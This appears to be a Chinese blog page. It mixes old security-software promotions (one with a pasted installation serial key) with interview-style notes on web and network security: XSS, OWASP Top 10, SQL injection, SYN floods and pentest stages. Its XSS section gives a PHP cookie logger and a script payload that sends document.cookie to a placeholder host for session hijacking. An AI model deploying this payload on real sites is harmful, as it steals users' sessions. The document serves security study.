+<p>诺顿反垃圾邮件2005将持续发挥作用，在大多数pop3连接中自动拦截和分析电子邮件，并在抵达用户收件箱时识别垃圾邮件。诺顿反垃圾邮件2005将紧密地和最新版本的微软Outlook，Outlook Express、Eudora以及Yahoo! Web email集成在一起，自动创建一个垃圾邮件目录来收集所有检测出的垃圾邮件。诺顿反垃圾邮件2005甚至将在微软Outlook接受Hotmail和MSN邮件时过滤垃圾邮件。这样，用户不仅节省了时间，还可以不受垃圾邮件可能包含的误导信息和不宜内容的干扰。<br>最完整的多合一安全和隐私保护套件<br>将诺顿防病毒软件2005、诺顿个人防火墙2005和诺顿反垃圾邮件2005无缝集成到一个软件套件后，诺顿网络安全特警2005将提供完整、自动的保护，可以针对最复杂的互联网威胁提供保护。诺顿网络安全特警2005还包含新的爆发警报，为用户带来附加好处–当威胁级别高的病毒爆发时，用户将自动接收到警报信息。爆发警报将分析用户PC机的安全状态，必要时立刻提供推荐方案强化防护。此外，诺顿网络安全特警2005将通过简单易用的网页内容过滤功能，能够使孩子和家庭不受少儿不宜或色情网站的影响。<br>安装序列号：BBC2-YGJP-X4B9-PBCM-VH6G-DYKD</p>
+<p>天网防火墙个人版是个人电脑使用的网络安全程序，根据管理者设定的安全规则把守网络，提供强大的访问控制、信息过滤等功能，帮你抵挡网络入侵和攻击，防止信息泄露。天网防火墙把网络分为本地网和互联网，可针对来自不同网络的信息，来设置不同的安全方案，适合于任何方式上网的用户。</p>
+<p>1)严密的实时监控<br>天网防火墙（个人版）对所有来自外部机器的访问请求进行过滤，发现非授权的访问请求后立即拒绝，随时保护用户系统的信息安全。<br>2)灵活的安全规则<br>天网防火墙（个人版）设置了一系列安全规则，允许特定主机的相应服务，拒绝其它主机的访问要求。用户还可以根据自已的实际情况，添加、删除、修改安全规则，保护本机安全。<br>3)应用程序规则设置<br>新版的天网防火墙增加对应用程序数据包进行底层分析拦截功能，它可以控制应用程序发送和接收数据包的类型、通讯端口，并且决定拦截还是通过，这是目前其它很多软件防火墙不具有的功能。<br>4)详细的访问记录和完善的报警系统<br>天网防火墙（个人版）可显示所有被拦截的访问记录，包括访问的时间、来源、类型、代码等都详细地记录下来，你可以清楚地看到是否有入侵者想连接到你的机器，从而制定更有效的防护规则。与以往的版本相比，天网防火墙（个人版）设置了完善的声音报警系统，当出现异常情况的时候，系统会发出预警信号，从而让用户作好防御措施。</p>
+<p>方正熊猫入侵防护个人版(TruPrevent) 2005</p>
+<p>文件大小：17.71M<br>运行平台：Windows9X/ME/NT/2000/XP</p>
+<p>方正熊猫入侵防护个人版2005（即TruPrevent）是方正安全公司联手欧洲熊猫软件为2005年推出的一款新品。产品基于“专门针对未知病毒和攻击而设计”的智能识别技术，即是通过采用“行为分析技术”鉴别文件是否具有危险性或攻击性，即使那些诸如冲击波、振荡波之流的未知病毒亦能够有效隔离。该技术改变了传统杀毒软件所使用的“响应式”技术（被动查杀），转而通过对程序行为的主动跟踪和分析，从而判断是否为病毒或攻击并对之相应做出防范措施。该产品面向家庭用户和SOHU用户，是针对个人PC的一款预防性安全解决方案。<br>朝华•安博士（VirusClean）是朝华软件应用服务有限公司与韩国安博士有限公司联合开发的针对Win 9X/Me/2000 Professional /XP 客户端专用的计算机杀毒软件。与国内外众多杀毒软件相比，VirusClean 不仅提供最快而最强有力的病毒查/杀功能，而且还可以监控、检测并修复互联网上收到的各种数据及文件中的病毒。VirusClean内置了具有国际离领先技术的WARP 防病毒引擎，因此误报率的可能性极少，而且具有出色的文件恢复功能。</p>
+<p>所获奖项：计算机世界——获“2003年中国信息安全优秀解决方案”<br>软件世界——获“2003年中国电子政务十佳防病毒解决方案”<br>中国计算机报——与“趋势”一起获得“2003年值得信赖防病毒品牌”<br>中国软件评测中心——以杀毒最快、资源占用最少获最高15颗星的“技术创新</p>
+<p>东方卫士2005（完整功能）下载版最先支持WindowsXP推出的SP2服务包，与SP2的安全中心进行了防毒认证，是最先获得微软认证的防毒软件之一。<br>能够和WindowsXP SP2安全中心状态形成互动，及时提醒防毒软件是否过期。<br>东方卫士2005（完整功能）下载版不仅延续了“一防、二杀、三恢复”的防毒理念，在防毒功能和特色功能上作了深入改进，真正做到了安全、稳定、易用！<br>东方卫士2005（完整功能）下载版防毒产品是完整功能版，而且便于下载（5.81MB）。<br>目前免费使用，免费升级！</p>
+<p>冰盾防火墙是全球第一款具备IDS入侵检测功能的专业级抗DDOS防火墙，来自IT技术世界一流的美国硅谷，由华人留学生Mr.Bingle Wang和Mr.Buick Zhang设计开发，采用国际领先的生物基因鉴别技术智能识别各种DDOS攻击和黑客入侵行为，防火墙采用微内核技术实现，工作在系统的最底层，充分发挥CPU的效能，仅耗费少许内存即获得惊人的处理效能。经高强度攻防试验测试表明：在抗DDOS攻击方面，工作于100M网卡冰盾约可抵御每秒25万个SYN包攻击，工作于1000M网卡冰盾约可抵御160万个SYN攻击包；在防黑客入侵方面，冰盾可智能识别Port扫描、Unicode恶意编码、SQL注入攻击、Trojan木马上传、Exploit漏洞利用等2000多种黑客入侵行为并自动阻止。冰盾防火墙的主要防护功能如下：</p>
+<p>★ 阻止DOS攻击：TearDrop、Land、Jolt、IGMP Nuker、Boink、Smurf、Bonk、BigPing、OOB等数百种。<br>★ 抵御DDOS攻击：SYN/ACK Flood、UDPFlood、ICMP Flood、TCP Flood等所有流行的DDOS攻击。<br>★ 拒绝TCP全连接攻击：自动阻断某一IP对服务器特定端口的大量TCP全连接资源耗尽攻击。<br>★ 防止脚本攻击：专业防范ASP、PHP、PERL、JSP等脚本程序的洪水式Flood调用导致数据库和WEB崩溃的拒绝服务攻击。<br>★ 对付DDOS工具：XDOS、HGOD、SYNKILLER、CC、GZDOS、PKDOS、JDOS、KKDOS、SUPERDDOS、FATBOY、SYNKFW等数十种。<br>★ 超强Web过滤：过滤URL关键字、Unicode恶意编码、脚本木马、防止木马上传等。<br>★ 侦测黑客入侵：智能检测Port扫描、SQL注入、密码猜测、Exploit利用等2000多种黑客入侵行为并阻断<br>全球最畅销的杀毒软件之一，McAfee防毒软件, 除了操作介面更新外,也将该公司的WebScanX功能合在一起,增加了许多新功能! 除了帮你侦测和清除病毒，它还有VShield自动监视系统，会常驻在System Tray，当你从磁盘、网络上、E-mail夹文件中开启文件时便会自动侦测文件的安全性，若文件内含病毒，便会立即警告，并作适当的处理，而且支持鼠标右键的快速选单功能，并可使用密码将个人的设定锁住让别人无法乱改你的设定。</p>
+<p>木马分析专家能自动分析、终止可疑进程、窗体类型及木马详细资料(如创建时间,文件大小,分析 Config.sys、Autoexec.bat、Winstart.bat、System.ini、Win.ini、注册表Load键值等),并能随时在线升级木马病毒代码特征库,100%查杀各种未知木马。另外，木马分析专家个人防火墙为您的计算机提供全面的保护，有效地监控任何网络连接。通过过滤不安全的服务，防火墙可以极大地提高网络安全，同时减小主机被攻击的风险。使系统具有抵抗外来非法入侵的能力，防止您的计算机和数据遭到破。<br>2005最新功能有：新增显示与进程及窗体相关的所有详细信息：包括进程ID、优先级、包含的线程数、包含的模块数、进程文件大小、创建时间、访问时间、修改时间、文件的版本信息等。新增(IE/木马)个人防火墙,在线杀毒。最新版加强了对第五代木马的分析与查杀,能完美的查杀各种无进程,捆绑木马。木马分析专家不仅是查杀木马工具,更是一个安全分析审核工具,它提供了十余种安全审核功能,将许多安全审核工作集成于一身,可以帮助您迅速判断本机的安全状况,大大方便您的工作。防火墙新增对第2代反弹型木马的监控。<br>现在有些木马以系统服务及Dll线程方式伪装插入IE或Explorer等正常进程中，使得这些病毒在正常模式下根本无法完全清除，因为你要杀死它之前必需先杀掉正常进程才行，但在安全模式下Windows只加载系统本身的模块，这时木马病毒也就无处隐藏了，这也是许多杀毒软件建议在安全模式下进行查杀的主要原因。分析以上原理，我们创新出一种无需进入安全模式却有着与它同样或更好效果的【天下无马】查杀模式，该功能主要针对：正常模式下无法清除的已知、未知及杀之过后又来的恶性木马病毒。新增加入防止被木马病毒封杀功能，而且在清除病毒的同时，会自动清理DLL、OCX等木马控件在注册表中的捆绑信息</p>
+<p>木马防线2005是安天公司推出的一款面向个人用户的专业级反木马信息安全 产品，也是国内首款通过公安部权威检测的同类软件。该软件的英文版Antiy Ghostbusters于2001年在欧美地区发布，当年就成为全球AntiVirus TOP 50中唯一的上榜中国产品。并在全球木马查杀、反间谍工具排行中遥遥领先，获得多次海内外专业媒体盛誉</p>
+<h3 id="作为网站管理者应当如何防范XSS"><a href="#作为网站管理者应当如何防范XSS" class="headerlink" title="作为网站管理者应当如何防范XSS?"></a>作为网站管理者应当如何防范XSS?</h3><p>坚决不要相信任何用户输入并过滤所有特殊字符。这样既可消灭绝大部分的XSS攻击。另一个建议是输出页面时将 变换成 。要记住，XSS漏洞极具破坏性，一旦被利用，它会给你的事业带来极大的损害。攻击者会将这些漏洞公之于众，这会在用户隐私的问题上大大降低你的网站的用户信赖度。当然，仅仅将 ( 和 ) 变换成 是不够的，最好将 ( 和 ) 变换成 ( 和 )，# 和 &amp; 变换成 # 和 &amp;。</p>
+<h3 id="常见的Web漏洞有哪些"><a href="#常见的Web漏洞有哪些" class="headerlink" title="常见的Web漏洞有哪些?"></a>常见的Web漏洞有哪些?</h3><p>用户验证漏洞：没有正确的对用户进行验证</p>
+<ol start="2">
+<li>用户凭证管理问题：没有正确的对用户凭证进行创建，保存，传输和保护，用户凭证包括用户密码等</li>
+<li>权限，特权以及访问控制漏洞</li>
+<li>缓存漏洞</li>
+<li>跨站脚本漏洞</li>
+<li>加密漏洞</li>
+<li>路径切换漏洞，用户输入可以包含”..”等字符来对应用程序路径进行切换和读取</li>
+<li>代码注入漏洞</li>
+<li>配置漏洞</li>
+<li>数据泄漏和信息</li>
+<li>输入验证漏洞</li>
+<li>操作系统命令脚本注入</li>
+<li>资源管理漏洞：允许用户操作过多的服务器资源，比如CPU，内存等等</li>
+<li>SQL注入</li>
+<li>链接跟踪：允许用户直接用链接访问或者下载用户不该访问的文件</li>
+</ol>
+<h3 id="Web应用常见的安全漏洞有哪些"><a href="#Web应用常见的安全漏洞有哪些" class="headerlink" title="Web应用常见的安全漏洞有哪些?"></a>Web应用常见的安全漏洞有哪些?</h3><p>随着存在安全隐患的Web应用程序数量的骤增，Open Web Application Security Project （开放式Web应用程序安全项目，缩写为OWASP）总结出了现有Web应用程序在安全方面常见的十大漏洞，以提醒企业及其程序开发人员尽量避免它们给企业IT系统带来的安全风险：<br>非法输入 Unvalidated Input</p>
+<p>失效的访问控制 Broken Access Control</p>
+<p>失效的账户和线程管理 Broken Authentication and Session Management</p>
+<p>跨站点脚本攻击 Cross Site Scripting Flaws</p>
+<p>缓存溢出问题 Buffer Overflows</p>
+<p>注入式攻击 Injection Flaws</p>
+<p>异常错误处理 Improper Error Handling</p>
+<p>不安全的存储 Insecure Storage</p>
+<p>程序拒绝服务攻击 Application Denial of Service</p>
+<p>不安全的配置管理 Insecure Configuration Management</p>
+<p>非法输入 Unvalidated Input<br>在数据被输入程序前忽略对数据合法性的检验是一个常见的编程漏洞。随着OWASP对Web应用程序脆弱性的调查，非法输入的问题已成为大多数Web应用程序安全漏洞方面的一个普遍现象。</p>
+<p>失效的访问控制 Broken Access Control<br>大部分企业都非常关注对已经建立的连接进行控制，但是，允许一个特定的字符串输入可以让攻击行为绕过企业的控制。</p>
+<p>失效的账户和线程管理 Broken Authentication and Session Management<br>有良好的访问控制并不意味着万事大吉，企业还应该保护用户的密码、会话令牌、账户列表及其它任何可为攻击者提供有利信息、能帮助他们攻击企业网络的内容。</p>
+<p>跨站点脚本攻击 Cross Site Scripting Flaws<br>这是一种常见的攻击，当攻击脚本被嵌入企业的Web页面或其它可以访问的Web资源中，没有保护能力的台式机访问这个页面或资源时，脚本就会被启动，这种攻击可以影响企业内成百上千员工的终端电脑。</p>
+<p>缓存溢出问题 Buffer Overflows<br>这个问题一般出现在用较早的编程语言、如C语言编写的程序中，这种编程错误其实也是由于没有很好地确定输入内容在内存中的位置所致。</p>
+<p>注入式攻击 Injection Flaws<br>如果没有成功地阻止带有语法含义的输入内容，有可能导致对数据库信息的非法访问，在Web表单中输入的内容应该保持简单，并且不应包含可被执行的代码。</p>
+<p>异常错误处理 Improper Error Handling<br>当错误发生时，向用户提交错误提示是很正常的事情，但是如果提交的错误提示中包含了太多的内容，就有可能会被攻击者分析出网络环境的结构或配置。</p>
+<p>不安全的存储 Insecure Storage<br>对于Web应用程序来说，妥善保存密码、用户名及其他与身份验证有关的信息是非常重要的工作，对这些信息进行加密则是非常有效的方式，但是一些企业会采用那些未经实践验证的加密解决方案，其中就可能存在安全漏洞。</p>
+<p>程序拒绝服务攻击 Application Denial of Service<br>与拒绝服务攻击 (DoS)类似，应用程序的DoS攻击会利用大量非法用户抢占应用程序资源，导致合法用户无法使用该Web应用程序。</p>
+<p>不安全的配置管理 Insecure Configuration Management<br>有效的配置管理过程可以为Web应用程序和企业的网络架构提供良好的保护。</p>
+<p>以上十个漏洞并不能涵盖如今企业Web应用程序中的全部脆弱点，它只是OWASP成员最常遇到的问题，也是所有企业在开发和改进Web应用程序时应着重检查的内容。</p>
+<h3 id="防御和检查SQL注入的主要手段有哪些"><a href="#防御和检查SQL注入的主要手段有哪些" class="headerlink" title="防御和检查SQL注入的主要手段有哪些?"></a>防御和检查SQL注入的主要手段有哪些?</h3><p>1.在代码中使用参数化的过滤性语句<br>2.避免使用解释程序<br>3.防范SQL注入，对应用程序的异常进行包装处理，避免出现一些详细的错误消息<br>4.使用专业的漏洞扫描工具对服务器和应用程序进行安全扫描。<br>5.在Web应用程序开发过程的所有阶段实施代码的安全检查</p>
+<h3 id="什么是网络安全中的双因素认证"><a href="#什么是网络安全中的双因素认证" class="headerlink" title="什么是网络安全中的双因素认证?"></a>什么是网络安全中的双因素认证?</h3><p>双因素是密码学的一个概念，从理论上来说，身份认证有三个要素：<br>第一个要素（所知道的内容）： 需要使用者记忆的身份认证内容，例如密码和身份证号码等。<br>第二个要素（所拥有的物品）：使用者拥有的特殊认证加强机制，例如动态密码卡（令牌），IC卡，磁卡等。<br>第三个要素（所具备的特征）：使用者本身拥有的惟一特征，例如指纹、瞳孔、声音等。<br>单独来看，这三个要素中的任何一个都有问题。“所拥有的物品”可以被盗走；“所知道的内容”可以被猜出、被分享，复杂的内容可能会忘记；“所具备的特征”最为强大，但是代价昂贵且拥有者本身易受攻击，一般用在顶级安全需求中。把前两种要素结合起来的身份认证的方法就是“双因素认证”。<br>双因素认证和利用自动柜员机提款相似：使用者必须利用提款卡(认证设备)，再输入个人识别号码(已知信息)，才能提取其账户的款项。 由于需要用户身份的双重认证，双因素认证技术可抵御非法访问者，提高认证的可靠性。简而言之，该技术降低了电子商务的两大风险：来自外部非法访问者的身份欺诈和来自内部的更隐蔽的网络侵犯。</p>
+<h1 id="笔试题————1、网络安全、Web安全、渗透测试笔试总结"><a href="#笔试题————1、网络安全、Web安全、渗透测试笔试总结" class="headerlink" title="笔试题————1、网络安全、Web安全、渗透测试笔试总结"></a>笔试题————1、网络安全、Web安全、渗透测试笔试总结</h1><h3 id="对称加密-非对称加密？"><a href="#对称加密-非对称加密？" class="headerlink" title="对称加密 非对称加密？"></a>对称加密 非对称加密？</h3><p>对称加密：加解密用同一密钥，密钥维护复杂 n（n-1）/2，不适合互联网传输密钥，加解密效率高。应用于加密数据。<br>非对称加密：公钥推不出私钥，每个用户一个非对称密钥对就可以，适合于互联网传输公钥，但是加密效率低，应用于数字签名及加密。</p>
+<h3 id="什么是同源策略？"><a href="#什么是同源策略？" class="headerlink" title="什么是同源策略？"></a>什么是同源策略？</h3><p>为了防止不同域在用户浏览器中彼此干扰，浏览器对从不同来源（域）收到的内容进行隔离。<br>浏览器不允许任何旧有脚本访问一个站点的cookie，否则，会话容易被劫持。</p>
+<p>只有发布cookie的站点能够访问这些cookie，只有通过该站点返回的页面所包含或加载的JavaScript才能访问cookie。</p>
+<h3 id="cookie存在哪里？可以打开吗"><a href="#cookie存在哪里？可以打开吗" class="headerlink" title="cookie存在哪里？可以打开吗"></a>cookie存在哪里？可以打开吗</h3><p>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Cookies<br>工具–文件夹选项–查看–将隐藏被保护的文件的对勾去掉就会看到cookies文件夹。</p>
+<h3 id="xss如何盗取cookie？"><a href="#xss如何盗取cookie？" class="headerlink" title="xss如何盗取cookie？"></a>xss如何盗取cookie？</h3><p>攻击者代码：<br>&lt;?php<br>$cookie=$_GET[‘cookie’];<br>$time=date(‘Y-m-d g:i:s’);<br>$referer=getenv(‘HTTP_REFERER’);<br>$cookietxt=fopen(‘cookie.txt’,’a’);<br>fwrite($cookietxt,”time:”.$time.” cookie:”.$cookie.” referer:”.$referer.””); 注意双引号，容易出错<br>fclose($cookietxt);<br>?&gt;<br>脚本端：</p>
+<p><script><br>document.write(‘<img src="http://ip/cookie.php?cookie='+document.cookie+'" width=0 height=0 border=0 />‘);<br></script><br>获取到cookie后，用firebug找到cookie，新建cookie<br>加入cookie，用referer来提交，无需输入帐号密码直接登录进去！</p>
+<h3 id="tcp、udp的区别及tcp三次握手，syn攻击？"><a href="#tcp、udp的区别及tcp三次握手，syn攻击？" class="headerlink" title="tcp、udp的区别及tcp三次握手，syn攻击？"></a>tcp、udp的区别及tcp三次握手，syn攻击？</h3><p>一、tcp、udp区别</p>
+<p>TCP的优点：</p>
+<p>可靠，稳定<br>TCP的可靠体现在TCP在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源。<br>TCP的缺点：</p>
+<p>慢，效率低，占用系统资源高，易被攻击<br>TCP在传递数据之前，要先建连接，这会消耗时间，而且在数据传递时，确认机制、重传机制、拥塞控制机制等都会消耗大量的时间，而且要在每台设备上维护所有的传输连接，事实上，每个连接都会占用系统的CPU、内存等硬件资源。<br>而且，因为TCP有确认机制、三次握手机制，这些也导致TCP容易被人利用，实现DOS、DDOS、CC等攻击。</p>
+<p>UDP的优点：</p>
+<p>快，比TCP稍安全<br>UDP没有TCP的握手、确认、窗口、重传、拥塞控制等机制，UDP是一个无状态的传输协议，所以它在传递数据时非常快。没有TCP的这些机制，UDP较TCP被攻击者利用的漏洞就要少一些。但UDP也是无法避免攻击的，比如：UDP Flood攻击……<br>UDP的缺点：</p>
+<p>不可靠，不稳定<br>因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。<br>基于上面的优缺点，那么：</p>
+<p>什么时候应该使用TCP：<br>当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。<br>在日常生活中，常见使用TCP协议的应用如下：</p>
+<p>浏览器，用的HTTP<br>FlashFXP，用的FTP<br>Outlook，用的POP、SMTP<br>Putty，用的Telnet、SSH<br>QQ文件传输<br>…………<br>什么时候应该使用UDP：<br>当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。<br>比如，日常生活中，常见使用UDP协议的应用如下：</p>
+<p>QQ语音<br>QQ视频<br>TFTP</p>
+<h3 id="二、TCP握手协议"><a href="#二、TCP握手协议" class="headerlink" title="二、TCP握手协议"></a>二、TCP握手协议</h3><p>在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。<br>第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；<br>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），<br>即SYN+ACK包，此时服务器进入SYN_RECV状态；<br>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，<br>客户端和服务器进入ESTABLISHED状态，完成三次握手。</p>
+<p>完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：<br>未连接队列：在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，<br>该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于Syn_RECV状态，<br>当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。 backlog参数：表示未连接队列的最大容纳数目。<br>SYN-ACK 重传次数　服务器发送完SYN－ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，<br>进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。注意，每次重传等待的时间不一定相同。<br>半连接存活时间：是指半连接队列的条目存活的最长时间，也即服务从收到SYN包到确认这个报文无效的最长时间，<br>该时间值是所有重传请求包的最长等待时间总和。有时我们也称半连接存活时间为Timeout时间、SYN_RECV存活时间。</p>
+<h3 id="三、SYN攻击原理"><a href="#三、SYN攻击原理" class="headerlink" title="三、SYN攻击原理"></a>三、SYN攻击原理</h3><p>SYN攻击属于DOS攻击的一种，它利用TCP协议缺陷，通过发送大量的半连接请求，耗费CPU和内存资源。<br>SYN攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN攻击并不管目标是什么系统，<br>只要这些系统打开TCP服务就可以实施。从上图可看到，服务器接收到连接请求（syn=j），<br>将此信息加入未连接队列，并发送请求包给客户（syn=k,ack=j+1），此时进入SYN_RECV状态。<br>当服务器未收到客户端的确认包时，重发请求包，一直到超时，才将此条目从未连接队列删除。<br>配合IP欺骗，SYN攻击能达到很好的效果，通常，客户端在短时间内伪造大量不存在的IP地址，<br>向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，<br>服务器需要不断的重发直至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，<br>目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。</p>
+<h3 id="证书要考哪些？"><a href="#证书要考哪些？" class="headerlink" title="证书要考哪些？"></a>证书要考哪些？</h3><p>信息安全国际第一认证——CISSP<br>信息安全国内认证——CISAW<br>信息安全国内认证——CISP<br>信息安全技术实操认证新贵——Security+<br>IT审计人员的必备之证——CISA</p>
+<h3 id="DVWA是如何搭建的？"><a href="#DVWA是如何搭建的？" class="headerlink" title="DVWA是如何搭建的？"></a>DVWA是如何搭建的？</h3><p>启动xampp（XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。）下的apache中间件和mysql<br>将dvwa放到xampp下的htdocs目录下<br>在浏览器输入<a href="http://127.0.0.1/dvwa" target="_blank" rel="noopener">http://127.0.0.1/dvwa</a> 即可使用啦！<br>还有owasp的漏洞练习平台：<a href="https://sourceforge.net/projects/owaspbwa/files/" target="_blank" rel="noopener">https://sourceforge.net/projects/owaspbwa/files/</a></p>
+<h3 id="渗透测试的流程是什么"><a href="#渗透测试的流程是什么" class="headerlink" title="渗透测试的流程是什么"></a>渗透测试的流程是什么</h3><p>渗透测试流程概述<br>前期交互阶段、情报搜集阶段、威胁建模阶段、漏洞分析阶段、<br>渗透攻击阶段（Exploitation）、后渗透攻击阶段（怎么一直控制，维持访问）、报告阶段。</p>
+<p>攻击前：网络踩点、网络扫描、网络查点<br>攻击中：利用漏洞信息进行渗透攻击、获取权限<br>攻击后：后渗透维持攻击、文件拷贝、木马植入、痕迹擦除</p>
+<h3 id="xss如何防御"><a href="#xss如何防御" class="headerlink" title="xss如何防御"></a>xss如何防御</h3><p>1.对前端输入做过滤和编码：<br>比如只允许输入指定类型的字符，比如电话号格式，注册用户名限制等，输入检查需要在服务器端完成，在前端完成的限制是容易绕过的；<br>对特殊字符进行过滤和转义；<br>2.对输出做过滤和编码：在变量值输出到前端的HTML时进行编码和转义；<br>3.给关键cookie使用http-only</p>
+<h3 id="IIS服务器应该做哪些方面的保护措施："><a href="#IIS服务器应该做哪些方面的保护措施：" class="headerlink" title="IIS服务器应该做哪些方面的保护措施："></a>IIS服务器应该做哪些方面的保护措施：</h3><p>整理来源：<a href="http://www.williamlong.info/archives/118.html" target="_blank" rel="noopener">http://www.williamlong.info/archives/118.html</a></p>
+<ol>
+<li>保持Windows升级:</li>
+<li>使用IIS防范工具</li>
+<li>移除缺省的Web站点</li>
+<li>如果你并不需要FTP和SMTP服务，请卸载它们</li>
+<li>有规则地检查你的管理员组和服务:</li>
+<li>严格控制服务器的写访问权限</li>
+<li>设置复杂的密码</li>
+<li>减少/排除Web服务器上的共享</li>
+<li>禁用TCP/IP协议中的NetBIOS:</li>
+<li>使用TCP端口阻塞</li>
+<li>仔细检查<em>.bat和</em>.exe 文件: 每周搜索一次*.bat</li>
+<li>管理IIS目录安全:</li>
+<li>使用NTFS安全:</li>
+<li>管理用户账户</li>
+<li>审计你的Web服务器:</li>
+</ol>
+<h3 id="虚拟机的几种连接方式及原理"><a href="#虚拟机的几种连接方式及原理" class="headerlink" title="虚拟机的几种连接方式及原理"></a>虚拟机的几种连接方式及原理</h3><p>安装完虚拟机后，默认安装了两个虚拟网卡，VMnet1和VMnet8，其他的未安装（当然也可以手动安装其他的）。其中VMnet1是host网卡，<br>用于host方式连接网络的。VMnet8是NAT网卡，用于NAT方式连接网络的。它们的IP地址是随机生成的，如果要用虚拟机做实验的话，<br>最好将VMnet1到VMnet8的IP地址改掉。习惯上把VMware虚拟网卡使用的网段”固定”，使用如下原则：VMnet1对应的网段是192.168.10.0，</p>
+<p>VMnet2对应的网段是192.168.20.0，其他的类似。当然平常只是随便用用的就不用改了，能上网就行了。</p>
+<p>VMware网络连接的方式主要有：桥接（Bridged）、NAT、主机网络（Host-Only）。</p>
+<ol>
+<li>Use bridged networking（使用桥接网络）</li>
+</ol>
+<p>说明：使用VMnet0虚拟交换机，此时虚拟机相当与网络上的一台独立计算机与主机一样，拥有一个独立的IP地址，<br>其网络拓扑如图1所示，使用桥接方式，A，A1，A2，B可互访。</p>
+<ol start="2">
+<li>Use network addresstranslation（NAT）</li>
+</ol>
+<p>说明：使用Vmnet8虚拟交换机，此时虚拟机可以通过主机单向网络上的其他工作站，其他工作站不能访问虚拟机。<br>其网络拓扑如图2所示，使用NAT方式，A1，A2可以访问B，但B不可以访问A1，A2。但A，A1，A2可以互访。</p>
+<ol start="3">
+<li>Use Host-Only networking（使用主机网络）</li>
+</ol>
+<p>说明：使用Vmnet1虚拟交换机，此时虚拟机只能与虚拟机、主机互访。也就是不能上Internet，其网络拓扑如图3所示，<br>使用Host方式，A，A1，A2可以互访，但A1，A2不能访问B，也不能被B访问。</p>
+<h3 id="xss有cookie一定可以无用户名密码登录吗？"><a href="#xss有cookie一定可以无用户名密码登录吗？" class="headerlink" title="xss有cookie一定可以无用户名密码登录吗？"></a>xss有cookie一定可以无用户名密码登录吗？</h3><p>基本可以。因为把cookie的值给浏览器，浏览器去访问页面会用已有的cookie去访问，如果cookie有效，就会直接进去。</p>
+<h1 id="笔试题————网络安全、web安全、渗透测试之笔试总结（二）"><a href="#笔试题————网络安全、web安全、渗透测试之笔试总结（二）" class="headerlink" title="笔试题————网络安全、web安全、渗透测试之笔试总结（二）"></a>笔试题————网络安全、web安全、渗透测试之笔试总结（二）</h1><h3 id="1-什么是WebShell"><a href="#1-什么是WebShell" class="headerlink" title="1.什么是WebShell?"></a>1.什么是WebShell?</h3><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的─种命令执行环境，也可以将其称做为─种网页后门。黑客在入侵了─个网站后，通常会将这些asp或php后门文件与网站服务器WEB目录下正常的网页文件混在─起，然后就可以使用浏览器来访问这些asp或者php后门，得到─个命令执行环境，以达到控制网站服务器的目的（可以上传下载文件，查看数据库，执行任意程序命令等）。国内常用的WebShell有海阳ASP木马，Phpspy，c99shell等。</p>
+<p>静态网页：最常用的格式文件就是html格式文件，大部分网页的格式都是html格式，html格式又包含有.htm、dhtml.xhtml.shtm.shtml。这些都是指静态页面，里面不含有动态程序。</p>
+<p>动态网页：页面级包括有ASP（基于JavaScript 或VbScript或C#）、JSP、PHP、ASPX、jspx、cgi。这些里面是包含服务器端执行的代码，也就是服务器在将这些网页发给客户端之前，会先执行里面的动态程序语言，并把执行后生成的html发送到客户端来的，所以我们在客户端看到的源代码也是html格式的（因为动态的代码直接在服务器上执行，而这些服务器代码是前台是不会显示出来。</p>
+<h3 id="2-什么是网络钓鱼？"><a href="#2-什么是网络钓鱼？" class="headerlink" title="2.什么是网络钓鱼？"></a>2.什么是网络钓鱼？</h3><p>网络钓鱼是通过大量发送声称来自于银行或其他知名机构的欺骗性垃圾邮件,意图引诱收信人给出敏感信息（如用户名、口令、帐号 ID 、 ATMPIN 码或信用卡详细信息）的一种攻击方式。</p>
+<p>最典型的网络钓鱼攻击将收信人引诱到一个通过精心设计与目标组织的网站非常相似的钓鱼网站上，并获取收信人在此网站上输入的个人敏感信息，通常这个攻击过程不会让受害者警觉。</p>
+<p>它常常导引用户到URL与接口外观与真正网站几无二致的假冒网站输入个人数据。就算使用强式加密的SSL服务器认证，要侦测网站是否仿冒实际上仍很困难。网钓是一种利用社会工程技术来愚弄用户的实例。它凭恃的是现行网络安全技术的低亲和度。</p>
+<p>3.你获取网络安全知识途径有哪些？</p>
+<p>网站，看雪，安全焦点，国内的乌云，FreeBuf<br>视频学习：i春秋，51cto，慕课网，实验楼，实验吧，网易云课堂等等<br>微信公众号、知乎等，企业src等<br>书籍，《白帽子讲web安全》《Web应用安全权威指南》等<br>然后就是请教牛人<br>最后是公司内技术分享。</p>
